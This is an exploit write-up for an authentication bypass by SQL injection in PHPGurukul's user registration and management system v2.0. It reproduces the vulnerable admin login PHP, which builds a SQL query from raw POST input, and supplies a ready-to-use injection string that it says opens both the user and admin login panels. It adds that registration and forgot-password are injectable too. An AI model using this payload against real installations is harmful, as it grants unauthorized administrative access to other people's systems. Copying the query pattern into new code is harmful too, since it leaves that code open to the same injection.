# Author: Besim ALTINOK
# Vendor Homepage: https://phpgurukul.com/
# Software Link: https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/
# Version: v2.0
# Tested on: Xampp
# Credit: Ä°smail BOZKURT


------ Details:

1- Vulnerable code is here (admin login: /admin/index.php):

<?php
session_start();
include("dbconnection.php");
if(isset($_POST[&#039;login&#039;]))
{
  $adminusername=$_POST[&#039;username&#039;];
  $pass=md5($_POST[&#039;password&#039;]);
  $ret=mysqli_query($con,"SELECT * FROM admin WHERE
username=&#039;$adminusername&#039; and password=&#039;$pass&#039;");
  $num=mysqli_fetch_array($ret);
if($num>0)
{
   $extra="manage-users.php";
   $_SESSION[&#039;login&#039;]=$_POST[&#039;username&#039;];
   $_SESSION[&#039;id&#039;]=$num[&#039;id&#039;];
echo "<script>window.location.href=&#039;".$extra."&#039;</script>";
exit();
}
else
{
    $_SESSION[&#039;action1&#039;]="*Invalid username or password";
   $extra="index.php";
echo "<script>window.location.href=&#039;".$extra."&#039;</script>";
exit();
}
}

2-  We can bypass authentication with SQLi:

Bypass code (user and admin login panel):

Username: pentester&#039; or&#039;1&#039;=1#
Password : pentester&#039; or&#039;1&#039;=1#

Finally: There is a lot of SQLi input in this project. Like, login,
registration, forgot password ...

